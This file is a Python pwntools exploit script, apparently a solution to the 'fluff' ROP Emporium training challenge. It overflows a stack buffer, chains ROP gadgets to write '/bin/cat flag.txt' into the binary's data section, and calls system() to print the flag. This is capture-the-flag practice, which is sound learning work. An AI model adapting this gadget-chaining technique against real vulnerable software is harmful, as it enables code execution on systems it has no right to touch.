from pwn import *



def write_string_to_address(xor_r11_r11_gadget, xor_r11_r12_gadget, pop_r12_gadget, mov_r10_r11_gadget, xchg_r11_r10_gadget, string_address, instring):
	returndata = ""

	instring_split = [instring[i:i+8] for i in range(0, len(instring), 8)]

	for i in range(len(instring_split)):
		# write address
		# pop address in to r12
		returndata += p64(pop_r12_gadget) # pop r12; mov r13d, 0x604060; ret;
		returndata += p64(string_address + (i*8))

		# clear r11
		returndata += p64(xor_r11_r11_gadget) # xor r11, r11; pop r14; mov edi, 0x601050; ret; 
		returndata += p64(0x0) # pop r14

		# xor r11 r12
		returndata += p64(xor_r11_r12_gadget) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
		returndata += p64(0x0) # pop r12

		# exchange r10 in to r11
		returndata += p64(xchg_r11_r10_gadget) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
		returndata += p64(0x0) # pop r15

		# Write data
		# pop data in to r12
		returndata += p64(pop_r12_gadget) # pop r12; mov r13d, 0x604060; ret;
		returndata += instring_split[i]

		# clear r11
		returndata += p64(xor_r11_r11_gadget) # xor r11, r11; pop r14; mov edi, 0x601050; ret; 
		returndata += p64(0x0) # pop r14

		# xor r11 r12
		returndata += p64(xor_r11_r12_gadget) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
		returndata += p64(0x0) # pop r12

		# perform the mov
		returndata += p64(mov_r10_r11_gadget) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
		returndata += p64(0x0) # pop r13
		returndata += p64(0x0) # pop r12

	return returndata

def pad_string(instring):
	if instring[:-1] != '\x00':
		instring += '\x00'
	while len(instring) % 8 != 0:
		instring += '\x00'
	return instring



e = ELF("./fluff")
p = process(e.path)
# p = gdb.debug(e.path,"b main\ncontinue\n")

junk = "A" * 40
plt_system = 0x4005e0
pop_rdi = 0x4008c3
section_data = 0x601050
command = "/bin/cat flag.txt"
command_pad = pad_string(command)

# Useful chains?
# 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
# 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
# 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
# End useful chains

pop_r12 = 0x0000000000400832
xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
mov_r10_r11 = 0x000000000040084e
xchg_r11_r10 = 0x0000000000400840
pop_rdi = 0x00000000004008c3


chain = junk
chain += write_string_to_address(xor_r11_r11, xor_r11_r12, pop_r12, mov_r10_r11, xchg_r11_r10, section_data, command_pad)
chain += p64(pop_rdi)
chain += p64(section_data)
chain += p64(plt_system)

p.sendline(chain)
print(p.readall())